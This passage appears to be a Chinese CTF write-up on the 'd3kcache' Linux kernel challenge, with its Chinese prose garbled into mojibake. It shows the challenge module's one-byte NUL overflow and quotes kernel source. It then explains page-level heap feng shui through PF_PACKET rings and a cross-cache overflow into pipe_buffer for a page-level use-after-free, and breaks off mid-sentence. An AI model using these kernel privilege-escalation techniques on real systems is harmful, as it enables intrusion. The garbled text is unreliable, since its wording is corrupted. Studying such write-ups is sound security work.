çš„å°æœ‹å‹æ‰€ä½œçš„æœ€ç»ˆé“åˆ«ï¼šï¼‰--><p>ç¬”è€…ä¸€ç›´åœ¨æƒ³ï¼Œä½œä¸ºä¸€åé»‘å®¢ï¼Œåœ¨å‰¥ç¦»å»å„ç§ä¸åŒçš„é¢˜ç›®ç»“æ„ã€æ¼æ´ç¯å¢ƒçš„èƒŒåï¼Œ<strong>æˆ‘ä»¬ç©¶ç«Ÿèƒ½åœ¨å¤šä¹ˆæç«¯çš„æƒ…å†µä¸‹å®Œæˆå¯¹ä¸€ä¸ªæ¼æ´çš„åˆ©ç”¨ï¼Ÿæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿè„±ç¦»å®éªŒå®¤çš„ç†æƒ³ç¯å¢ƒå®ç°ä¸€ç§è¶³ä»¥åº”ç”¨åœ¨å®æˆ˜ä¸­çš„é€šè§£ï¼Ÿ</strong></p><p>Google åœ¨ CVE-2021-22555 å½“ä¸­å‘æˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªæ™®é€šçš„å †ä¸Š 2 å­—èŠ‚æº¢å‡ºå¦‚ä½•å˜æˆå †æº¢å‡º&amp; UAF é€šæ€è§£æ³•ï¼Œ<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">BitsByWill</a> åœ¨ corCTF 2022 ä¸­å‘æˆ‘ä»¬å±•ç¤ºäº†åˆ©ç”¨é¡µçº§å†…æ ¸å †é£æ°´æ‰“ç ´ä¸åŒ caches é—´çš„é˜»éš”ï¼Œ<a href="https://syst3mfailure.io/">D3v17</a> åˆ™ä»…åˆ©ç”¨ä¸€ä¸ª <code>&#39;\0&#39;</code> å­—èŠ‚çš„å †æº¢å‡ºä¾¿å®Œæˆäº†å†…æ ¸ææƒï¼Œ<a href="https://kylebot.net/">Kylebot</a> æ›´æ˜¯å°†è¿™ä¸€ä¸ª <code>&#39;\0&#39;</code> å­—èŠ‚çš„å †æº¢å‡ºè½¬æˆäº† cross-cache overflow å®Œæˆåˆ©ç”¨ï¼Œé‚£ä¹ˆå†æ›´è¿›ä¸€æ­¥å‘¢â€”â€”</p><ul><li>å¦‚æœæ¼æ´æ‰€åœ¨ç»“æ„ä½“å¤§å°ä¸å¤Ÿåˆé€‚&#x2F;ç»“æ„ä½“è‡ªèº«æ— æ³•å¸®åŠ©æˆ‘ä»¬å®Œæˆåˆ©ç”¨ï¼Œæˆ‘ä»¬åªèƒ½å€ŸåŠ© <code>msg_msg</code> ç­‰ç»“æ„ä½“å»é€‚é…å¤§å°ï¼Œä½†è¿™ç±»ç»“æ„ä½“è¾ƒä¸ºç¨€æœ‰ä¸”å­˜åœ¨è¯¸å¤šé™åˆ¶ï¼ˆä¾‹å¦‚å¾€å¾€å¸¦æœ‰ä¸€ä¸ª headerï¼‰</li><li>å¦‚æœæ¼æ´å­˜åœ¨äºä¸€ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code> å½“ä¸­ï¼Œæˆ‘ä»¬æ— æ³•å€ŸåŠ©å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“å®Œæˆåˆ©ç”¨ï¼Œåªèƒ½è€ƒè™‘è½¬åŒ–ä¸º cross-cache overflow</li><li>å¦‚æœæ¼æ´ä»…æœ‰ 1 å­—èŠ‚çš„æº¢å‡ºï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨é¡µçº§å †é£æ°´è½¬æˆåˆ©ç”¨ Google çš„é€šæ€ exp ï¼Œåˆæˆ–æ˜¯ç¦ç”¨äº† System V æ¶ˆæ¯é˜Ÿåˆ—æ— æ³•åˆ©ç”¨å¤šçº§ <code>msg_msg</code>  æ„é€  UAFï¼Œæˆ‘ä»¬ä¾¿åªèƒ½è€ƒè™‘å…¶ä»–çš„æ–¹æ¡ˆ</li><li>å¦‚æœç³»ç»Ÿå†…å­˜è¾ƒå°ï¼Œ æˆ–æ˜¯ <code>modprobe_path</code> ä¸ºé™æ€å€¼ï¼ŒKylebot çš„ unlink attack å°†æ— æ³•å‘æŒ¥ä½œç”¨ï¼Œæˆ‘ä»¬åªå¥½è€ƒè™‘ D3v17 çš„ <code>poll_list</code> ä»»æ„é‡Šæ”¾</li><li>å¦‚æœæ¼æ´æ‰€åœ¨ç»“æ„ä½“å¤§å°ä¸å¤Ÿåˆé€‚ï¼Œæˆ‘ä»¬åªèƒ½è¿›è¡Œæ›´åŠ ç»†ç²’åº¦çš„é¡µçº§å †é£æ°´ï¼Œ<strong>è€Œä¸åŒ order é—´çš„é£æ°´ä¼šä½¿å¾—æˆåŠŸç‡å¤§æ‰“æŠ˜æ‰£</strong></li><li><strong>å¦‚æœå†…æ ¸å¼€å¯äº† Control Flow Integrityï¼Œåˆæˆ–è€…æˆ‘ä»¬ç”šè‡³éƒ½ä¸çŸ¥é“å†…æ ¸é•œåƒä¿¡æ¯ï¼Œé‚£ä¹ˆä¼ ç»Ÿçš„ ROP æ–¹æ³•åŸºæœ¬å®£å‘Šæ­»äº¡</strong></li></ul><p><strong>åœ¨è¿™æ ·æç«¯çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜ä»èƒ½å¤Ÿæ‰¾åˆ°ä¸€ç§é€šæ³•æ¥å®Œæˆå¯¹å†…æ ¸æ¼æ´çš„åˆ©ç”¨ï¼Ÿ</strong>â€”â€”è¿™ä¾¿æ˜¯ç¬”è€…åœ¨å‡ºè¿™é“é¢˜æ—¶æœ€åˆçš„æƒ³æ³•ï¼šï¼‰</p><!--æ­¤å¤–ï¼Œç¬”è€…è®¤ä¸ºï¼Œ**è‹¥æˆ‘ä»¬çœŸçš„æ‰¾åˆ°äº†è¿™æ ·çš„ä¸€ç§é€šæ³•ï¼Œé‚£ä¹ˆæ­¤åçš„åŸºäºå†…å­˜ç ´åçš„ Linux kernel exploitation ä¾¿çœŸæ­£ç®—æ˜¯å®£å‘Šèµ°åˆ°äº†å°½å¤´ï¼Œæ­¤åæ‰€æœ‰çš„æ­¤ç±»æ¼æ´æˆ–æ˜¯é¢˜ç›®ä¸è¿‡éƒ½æ˜¯æ¢ä¸€ç§å½¢å¼è¿‡å®¶å®¶ç½¢äº†ï¼šï¼‰**----è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç¬”è€…è¦ç”¨ ã€Ševaï¼šç»ˆã€‹ çš„é‚£å¥è¯æ¥ä½œä¸ºè¿™é“é¢˜ç›®çš„æ ‡è¯­ã€‚--><h1 id="0x01-é¢˜ç›®åˆ†æ"><a href="#0x01-é¢˜ç›®åˆ†æ" class="headerlink" title="0x01.é¢˜ç›®åˆ†æ"></a>0x01.é¢˜ç›®åˆ†æ</h1><p>é¢˜ç›®é€†å‘èµ·æ¥åº”è¯¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œåœ¨æ¨¡å—åˆå§‹åŒ–å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code> ï¼Œå¯¹è±¡å¤§å°ä¸º 2048ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">d3kcache_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    kcache_jar = kmem_cache_create_usercopy(<span class="hljs-string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="hljs-number">0</span>, <br>                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <br>                         <span class="hljs-number">0</span>, KCACHE_SIZE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">memset</span>(kcache_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(kcache_list));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰çš„ ioctl å‡½æ•°æä¾›äº†åˆ†é…ã€è¿½åŠ ç¼–è¾‘ã€é‡Šæ”¾ã€è¯»å–çš„ä¸€ä¸ªå †èœå•ï¼Œæ¼æ´ä¾¿å‡ºåœ¨è¿½åŠ ç¼–è¾‘å½“ä¸­ï¼Œå½“å†™æ»¡ 2048 å­—èŠ‚æ—¶å­˜åœ¨ç€ä¸€ä¸ª <code>\0</code> å­—èŠ‚çš„æº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kcache_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">case</span> KCACHE_APPEND:<br>            <span class="hljs-keyword">if</span> (usr_cmd.idx &lt; <span class="hljs-number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM <br>                || !kcache_list[usr_cmd.idx].buf) &#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || <br>                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;<br>                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                size = usr_cmd.sz;<br>            &#125;<br><br>            kcache_buf = kcache_list[usr_cmd.idx].buf;<br>            kcache_buf += kcache_list[usr_cmd.idx].size;<br><br>            <span class="hljs-keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            kcache_buf[size] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br><br>            retval = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶æŸ¥çœ‹é¢˜ç›®æ‰€æä¾›çš„å†…æ ¸ç¼–è¯‘æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°<strong>å¼€å¯äº† Control Flow Integrity ä¿æŠ¤</strong>ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_CFI_CLANG</span>=y<br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„å„ç§å¸¸è§„ä¿æŠ¤ï¼ˆKPTIã€KASLRã€Hardened Usercopyã€â€¦ï¼‰åŸºæœ¬ä¸Šéƒ½æ˜¯å¼€å¯çš„ï¼Œè¿™é‡Œå°±ä¸é˜è¿°äº†</p><blockquote><p>å½“ç„¶ï¼Œåšå†…æ ¸æ¼æ´åˆ©ç”¨è‡ªç„¶è¦é»˜è®¤è¿™äº›ä¿æŠ¤éƒ½å¼€äº†ï¼šï¼‰</p></blockquote><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>ç”±äºé¢˜ç›®æ‰€åœ¨çš„ <code>kmem_cache</code> ä¸ºä¸€ä¸ªç‹¬ç«‹çš„  <code>kmem_cache</code> ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è€ƒè™‘ <strong>cross-cache overflow</strong>ï¼š<strong>æº¢å‡ºåˆ°å…¶ä»–ç»“æ„ä½“æ‰€åœ¨é¡µé¢ä¸Šå®Œæˆåˆ©ç”¨</strong></p><blockquote><p>æ¯•ç«Ÿä½ æ€»ä¸èƒ½æŒ‡æœ›åœ¨ freelist ç›¸å…³ä¿æŠ¤éƒ½å¼€å¯çš„æƒ…å†µä¸‹ free object çš„ next æŒ‡é’ˆåˆšå¥½åœ¨å‰ 8 å­—èŠ‚ç„¶åè¦†å†™åˆåˆšå¥½èƒ½æŠŠ freelist åŠ«æŒåˆ°æœ‰æ•ˆå¯æ§åœ°å€ä¸Šï¼šï¼‰</p></blockquote><h2 id="Step-I-é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€"><a href="#Step-I-é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€" class="headerlink" title="Step.I - é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€"></a>Step.I - é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€</h2><p>ä¸ºäº†ä¿è¯æº¢å‡ºçš„ç¨³å®šæ€§ï¼Œè¿™é‡Œç¬”è€…ä½¿ç”¨é¡µçº§å †é£æ°´çš„æ–¹æ³•æ¥æ„é€ <strong>é¢„æº¢å‡ºå¸ƒå±€</strong></p><h3 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h3><p>é¡µçº§å †é£æ°´æ˜¯ä¸€ç§å…¶å®ä¸ç®—æ–°ä½†æ˜¯å…¶å®è¿˜æ˜¯ç¨å¾®æœ‰ç‚¹æ–°çš„åˆ©ç”¨æ‰‹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œ<strong>é¡µçº§å †é£æ°´</strong>å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ ¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬<strong>æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒ</strong></p><p>é¦–å…ˆè®©æˆ‘ä»¬é‡æ–°å®¡è§† slub allocator å‘ buddy system è¯·æ±‚é¡µé¢çš„è¿‡ç¨‹ï¼Œå½“ freelist page å·²ç»è€—ç©ºä¸” partial é“¾è¡¨ä¹Ÿä¸ºç©ºæ—¶ï¼ˆæˆ–è€… <code>kmem_cache</code> åˆšåˆšåˆ›å»ºåè¿›è¡Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ï¼‰ï¼Œå…¶ä¼šå‘ buddy system ç”³è¯·é¡µé¢ï¼š</p><p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p><p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬é‡æ–°å®¡è§† buddy system ï¼Œå…¶åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼š</p><p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µ<strong>æ˜¯ç‰©ç†è¿ç»­çš„</strong>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p><ul><li>å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li><li>é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>vulnerable kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li><li>é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>victim kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li></ul><p><strong>æ­¤æ—¶æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½æº¢å‡ºåˆ°å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“ä¸Šï¼Œä»è€Œå®Œæˆ cross-cache overflow</strong></p><h3 id="å…·ä½“åˆ©ç”¨"><a href="#å…·ä½“åˆ©ç”¨" class="headerlink" title="å…·ä½“åˆ©ç”¨"></a>å…·ä½“åˆ©ç”¨</h3><p>åœ¨å†…æ ¸å½“ä¸­æœ‰ç€å¾ˆå¤šçš„å¯ä»¥ç›´æ¥å‘ buddy system è¯·æ±‚é¡µé¢çš„ APIï¼Œè¿™é‡Œç¬”è€…é€‰ç”¨ä¸€ä¸ªæ¥è‡ªäº <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> çš„æ–¹æ¡ˆï¼š</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª protocol ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING â†“</span><br>    packet_set_ring()<br>    alloc_pg_vec()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>alloc_pg_vec()</code> ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>pgv</code> ç»“æ„ä½“ï¼Œç”¨ä»¥åˆ†é… <code>tp_block_nr</code> ä»½ 2<sup>order</sup> å¼ å†…å­˜é¡µï¼Œå…¶ä¸­ <code>order</code> ç”± <code>tp_block_size</code> å†³å®šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>alloc_one_pg_vec_page()</code> ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>__get_free_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿›è¡Œå¤§é‡çš„é¡µé¢è¯·æ±‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œ <code>pgv</code> ä¸­çš„é¡µé¢ä¹Ÿä¼šåœ¨ socket è¢«å…³é—­åé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    free_pg_vec()<br></code></pre></td></tr></table></figure><p> <code>setsockopt()</code>  ä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆ<strong>é¡µçº§å †é£æ°´</strong>ï¼Œå½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ  <code>setsockopt()</code>  ä¾¿<strong>ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜</strong>ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—<strong>å¯¹ä¸€å—è¿ç»­å†…å­˜çš„é¡µçº§æŒæ§</strong>ï¼Œä»è€Œå¯ä»¥è¿™æ ·æ„é€ å‡ºå¦‚ä¸‹å›¾æ‰€ç¤ºå †å¸ƒå±€ï¼š</p><ul><li>å…ˆé‡Šæ”¾ä¸€éƒ¨åˆ†é¡µé¢ï¼Œè®© victim object å–å¾—è¿™äº›é¡µé¢</li><li>é‡Šæ”¾ä¸€ä»½é¡µé¢ï¼Œå‘é¢˜ç›®æ¨¡å—è¯·æ±‚åˆ†é…å¯¹è±¡ï¼Œä»è€Œè·å¾—è¯¥ä»½é¡µé¢</li><li>å†é‡Šæ”¾ä¸€éƒ¨åˆ†é¡µé¢ï¼Œè®© victim object å–å¾—è¿™äº›é¡µé¢</li></ul><p>è¿™æ ·é¢˜ç›®æ‰€åœ¨çš„é¡µé¢ä¾¿ä¼šè¢«å¤¹åœ¨ victim å¯¹è±¡çš„é¡µé¢ä¸­é—´ï¼Œä½¿å¾—<strong>æº¢å‡ºçš„ç¨³å®šæ€§å¤§å¹…å¢åŠ </strong></p><p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="image.png"></p><h2 id="Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§ UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§ UAF</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘æº¢å‡ºçš„ç›®æ ‡å¯¹è±¡ï¼Œç›¸ä¿¡å¤§å®¶æœ€å…ˆæƒ³åˆ°çš„åº”è¯¥æ˜¯ä¸‡èƒ½ç»“æ„ä½“ <code>msg_msg</code> ï¼Œä½†æ˜¯åœ¨ç¬”è€…çœ‹æ¥è¿™ä¸ªç»“æ„ä½“ <em>ä»æ—§ä¸å¤Ÿå¼ºå¤§</em> ï¼Œè€Œä¸”åœ¨è¿‡å»çš„å„ç§æ¼æ´åˆ©ç”¨å½“ä¸­æˆ‘ä»¬æœªå…ä¹Ÿå¤ªä¾èµ–äº <code>msg_msg</code> äº†ï¼Œæ‰€ä»¥ç¬”è€…æƒ³è¦æ¢ç´¢ä¸€äº›æ–°çš„æ–¹æ³•ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/01/sJB9zbLgSCYV8KE.png" alt="çŒªçŒªä¾ ï¼Œä½ å¤ªä¾èµ–è¶…çº§æ£’æ£’ç³–äº†.png"></p><p>ç”±äºä»…æœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€äº›åœ¨ç»“æ„ä½“å¤´éƒ¨ä¾¿æœ‰æŒ‡å‘å…¶ä»–å†…æ ¸å¯¹è±¡çš„æŒ‡é’ˆçš„å†…æ ¸å¯¹è±¡ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ <code>pipe_buffer</code> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„çš„åˆ©ç”¨å¯¹è±¡ï¼Œå…¶å¼€å¤´æœ‰ç€æŒ‡å‘ <code>page</code> ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œ <code>page</code> çš„å¤§å°ä»…ä¸º <code>0x40</code> ï¼Œå¯ä»¥è¢« 0x100 